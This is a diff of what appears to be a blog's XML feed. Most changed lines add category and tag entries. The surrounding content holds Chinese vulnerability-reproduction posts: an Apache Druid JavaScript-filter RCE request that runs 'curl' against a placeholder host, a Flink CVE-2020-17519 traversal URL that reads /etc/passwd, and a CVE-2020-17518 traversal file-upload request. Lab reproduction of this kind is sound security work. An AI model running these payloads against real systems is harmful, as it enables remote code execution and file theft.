@@ -11,8 +11,16 @@
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建测试环境"><a href="#自行搭建测试环境" class="headerlink" title="自行搭建测试环境"></a>自行搭建测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/1612338142733.png" alt="image"></p><h2 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/1612338225038.png" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1612338397845.png" alt="image"></p><h3 id="此处路径与文件填下面的值"><a href="#此处路径与文件填下面的值" class="headerlink" title="此处路径与文件填下面的值"></a>此处路径与文件填下面的值</h3><pre><code>quickstart/tutorial/wikiticker-2015-09-12-sampled.json.gz</code></pre><p><img src= "/img/loading.gif" data-lazy-src="/images/1612338507305.png" alt="image"></p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h5 id="filter-参数"><a href="#filter-参数" class="headerlink" title="filter 参数"></a>filter 参数</h5><pre><code>&#123;&quot;type&quot;:&quot;selector&quot;,&quot;dimension&quot;:&quot;&quot;,&quot;value&quot;:&quot;&quot;&#125;&#125;&#125;</code></pre><h5 id="改成"><a href="#改成" class="headerlink" title="改成"></a>改成</h5><pre><code>&#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;curl xx.xx.xx.xx&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;</code></pre><p><img src= "/img/loading.gif" data-lazy-src="/images/1612338658025.png" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="/images/1612338685632.png" alt="image"></p><h3 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1612338755741.png" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="/images/1612338778844.png" alt="image"></p><h2 id="最终poc-为"><a href="#最终poc-为" class="headerlink" title="最终poc 为"></a>最终poc 为</h2><pre><code>POST http://xx.xx.xx.xx/druid/indexer/v1/sampler HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 1103&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https://xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;url xx.xx.xx.xx&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</code></pre>]]></content>
       
       
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
       
         <tags>
+            
+            <tag> 漏洞复现 </tag>
             
             <tag> rce </tag>
             
@@ -41,9 +49,9 @@
       
         <tags>
             
-            <tag> rce </tag>
-            
             <tag> 漏洞复现 </tag>
+            
+            <tag> rce </tag>
             
             <tag> 命令执行 </tag>
             
@@ -60,6 +68,12 @@
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h2><h4 id="搭建好测试环境进入flink"><a href="#搭建好测试环境进入flink" class="headerlink" title="搭建好测试环境进入flink"></a>搭建好测试环境进入flink</h4><p><img src= "/img/loading.gif" data-lazy-src="/images/1612318501808.png" alt="image"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><pre><code>    https://xx.xx.xx.xx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code></pre><p><img src= "/img/loading.gif" data-lazy-src="/images/1612318543434.png" alt="image"></p><h2 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h2><h4 id="直接复用poc"><a href="#直接复用poc" class="headerlink" title="直接复用poc"></a>直接复用poc</h4><pre><code>POST /jars/upload HTTP/1.1Host: xx.xx.xx.xxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: multipart/form-data; boundary=--------721072898Content-Length: 151----------721072898Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../../../tmp/test.txt&quot;testtest----------721072898--</code></pre><p>   <img src= "/img/loading.gif" data-lazy-src="/images/1612319702839.png" alt="image"></p><h4 id="测试是否上传成功"><a href="#测试是否上传成功" class="headerlink" title="测试是否上传成功"></a>测试是否上传成功</h4><p>  <img src= "/img/loading.gif" data-lazy-src="/images/1612319749301.png" alt="image"></p>]]></content>
       
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
       
       
         <tags>
@@ -274,6 +288,8 @@
       <categories>
           
           <category> 渗透测试 </category>
+          
+          <category> 工具 </category>
           
       </categories>
       
